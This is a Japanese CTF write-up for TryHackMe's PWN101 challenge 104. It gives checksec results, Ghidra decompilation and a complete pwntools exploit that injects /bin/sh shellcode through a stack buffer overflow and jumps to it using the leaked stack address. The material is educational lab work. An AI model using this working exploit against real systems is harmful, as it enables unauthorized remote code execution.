---
title: TryHackMe PWN101 Writeup (4) PWN104
pubDatetime: 2026-04-26
description: TryHackMe PWN101 Challenge 4のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

PIEじゃない

```shellsession
$ file pwn104-1644300377109.pwn104
pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
```

## checksec

スタック実行可能
Canaryなし

```shellsession
$ .venv/bin/pwn checksec pwn104-1644300377109.pwn104
[*] '/home/hat0uma/work/pwn104-1644300377109.pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

## 実行してみる

なんかのアドレスを教えてくれる。

```shellsession
$ ./pwn104-1644300377109.pwn104
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7ffdc932dc20
a

```

## Ghidra

スタックの先頭を教えてくれてるっぽい。BOFあり。
canaryなしでスタック実行可能なのでシェルコードを直接書き込む。

```c
void main(void)
{
  undefined1 local_58 [80];

  setup();
  banner();
  puts(&DAT_00402120);
  puts(&DAT_00402148);
  puts(&DAT_00402170);
  printf("I\'m waiting for you at %p\n",local_58);
  read(0,local_58,200);
  return;
}
```

## solver

```python
bin = "./pwn104-1644300377109.pwn104"
elf = pwn.ELF(bin)
pwn.context.binary = elf
# p = pwn.process(bin)
p = pwn.remote("10.144.176.145", 9004)

ret = p.recvuntil("😏💪\n".encode())
ret = p.recvline()

# スタックのアドレスを読む
s = ret.decode().split(" ")[-1]
stack_addr = int(s, 16)
log.info(f"stack address = 0x{stack_addr:x}")

# ペイロード生成
payload = b""

# /bin/shを実行するコードを生成して先頭に入れる
shellcode = pwn.asm(pwn.shellcraft.sh())
payload += shellcode

# 残りを適当に埋める。
payload += b"a" * (80 - len(payload))

# saved RBPの分を適当に埋める。
payload += b"b" * 8

# リターンアドレスをスタックの先頭（シェルコード）に書き換える。
payload += stack_addr.to_bytes(8, "little")

p.send(payload)
p.interactive()
```
